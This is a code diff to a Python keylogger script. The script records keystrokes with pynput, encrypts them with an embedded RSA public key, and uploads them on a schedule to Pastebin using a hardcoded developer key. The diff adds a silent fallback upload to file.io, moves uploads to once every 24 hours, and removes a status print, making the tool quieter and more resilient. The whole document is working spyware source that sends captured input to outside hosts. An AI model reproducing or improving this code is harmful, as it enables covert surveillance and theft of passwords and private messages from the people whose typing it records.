@@ -1,15 +1,16 @@
-import base64
 from math import ceil
 from time import sleep
+from requests import post
+from base64 import b64decode
 from urllib.parse import urlencode
-from urllib.request import Request, urlopen
+from pynput.keyboard import Listener
+from urllib.request import urlopen, Request
 
 from apscheduler.schedulers.blocking import BlockingScheduler
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
-from pynput.keyboard import Key, Listener
-
 
 class PastebinError(Exception):
     pass
@@ -127,7 +128,7 @@ def upload():
     toBeEncrypted = bytes(msg.encode())
     public_key_data = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9Q1LWfwpLIc0/sflB/MZHEZM9fL4MGyqSleMNaKeGvEZictQqojDJvFo3TbgVUPY65tkMd885kg+JsdzXu48qcWpIgbsKtxm52YYa9z1km/T8IPmULFQHnqS75+jPeWRq4hKqm8PjWSluLIqjy7Ao0F0rfVeM3WL6K1jhELq3MpYvgBVeWX6UbzUpT++sqkwlJGcSgvWPhh7ENn3CO+tXPVGJIYqO2RdTck0MY91fzciQf1Bbm6nRGPri48fcP/ZR315oJ6Lile+P4sNmO3J1V1HTXp4ShVmq1F3NT+p9wcNp44mBF+ld0Nz6kmFpKB74PpVraYtKcjTzY4by/qmvwIDAQAB"
     
-    public_key = serialization.load_der_public_key(base64.b64decode(public_key_data),backend=default_backend())
+    public_key = serialization.load_der_public_key(b64decode(public_key_data),backend=default_backend())
     encrypt_list = list()
     lenofMessage = len(toBeEncrypted) 
     loop_times = ceil(lenofMessage/128) 
@@ -149,26 +150,35 @@ def upload():
         encrypt_list.append(encrypted)
     urls_list = list()
     
-    for data in encrypt_list:
-        dev_key = "2lTrhrXVkkGTuN1CKqS_j1_HgpoQ9ZRV"
-        rs = paste(dev_key, data)
-        urls_list.append(rs) 
-        sleep(2) 
+    try:
+        for data in encrypt_list:
+            dev_key = "2lTrhrXVkkGTuN1CKqS_j1_HgpoQ9ZRV"
+            rs = paste(dev_key, data)
+            urls_list.append(rs) 
+            sleep(2) 
     
+
+    except:
+        try:
+            for data in encrypt_list:
+                url = 'https://file.io'
+                data = {"file": data}
+                response = post(url, files=data)
+                res = response.json()
+                urls_list.append(res["link"])
+                sleep(2)
+        except:
+            pass
+              
     for url in urls_list:
         print(url)
-    
     msg = ''
 
 
 if __name__ == '__main__':
-    print("WE ARE WORKING")
     listener = Listener(on_press=on_press)
     listener.start()
     scheduler = BlockingScheduler()
-    scheduler.add_job(upload, 'interval', minutes=1)     # minutes=1 to test
+    scheduler.add_job(upload, 'interval', hours=24) #minutes=1 to test
     scheduler.start()
-    
-
-
     
